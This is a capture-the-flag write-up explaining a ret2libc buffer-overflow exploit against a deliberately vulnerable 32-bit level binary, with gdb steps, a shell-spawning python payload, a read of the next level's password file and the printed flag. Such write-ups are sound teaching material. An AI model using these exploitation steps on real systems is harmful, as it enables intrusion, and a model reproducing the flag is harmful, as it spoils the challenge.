# Level 01 — ret2libc via buffer overflow

## Overview
A 32-bit binary asks to "verify" a username. It reads input into a stack
buffer with `fgets` and does a weak comparison. The real goal is a classic
**ret2libc**: overflow the buffer, overwrite the saved `EIP`, and redirect
execution to `system("/bin/sh")`.

## Analysis
```sh
strings level01          # reveals "dat_wil" (expected username) and "admin"
objdump -d level01        # inspect main
```
Key instructions in `main`:
```
8048565:  movl   $0x64,0x4(%esp)      ; fgets reads 0x64 = 100 bytes
804856d:  lea    0x1c(%esp),%eax      ; into buffer at esp+0x1c
8048574:  call   8048370 <fgets@plt>
```
The buffer starts at `esp+0x1c` but up to 100 bytes are read, so the saved
return address is reachable and overflowable.

## Finding the offset
Craft an input that first passes the username check (`dat_wil\n`), then pads
the buffer and overwrites the return address:
```sh
python -c 'print "dat_wil\n" + "A"*80 + "BBBB"' > /tmp/test
gdb ./level01
(gdb) run < /tmp/test
(gdb) info registers eip        # eip = 0x42424242 → control confirmed
```
The 80 `A`s fill the buffer up to the saved `EIP`, which is then set to
`BBBB` (`0x42424242`).

## Gathering addresses
```
(gdb) break main
(gdb) run
(gdb) print system              # 0xf7e6aed0
(gdb) print exit                # 0xf7e5eb70
(gdb) find &system, +9999999, "/bin/sh"
(gdb) x/s <addr>                # confirm "/bin/sh" string
```
ASLR must be disabled for the libc addresses to be stable:
```sh
cat /proc/sys/kernel/randomize_va_space   # should be 0
```

## Exploitation
Layout after the 80-byte pad: `[system][exit][&"/bin/sh"]`.
```sh
(python -c 'print "dat_wil\n" + "A"*80 + "SYSTEM" + "EXIT" + "\xec\x97\xf8\xf7"'; cat) | ./level01
```
(The `SYSTEM`/`EXIT` placeholders are the little-endian addresses of `system`
and `exit`; the final value is the address of `/bin/sh`.) `cat` keeps stdin
open so the spawned shell stays interactive.

## Result
```sh
cat /home/users/level02/.pass
su level02
```

## Flag
```
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
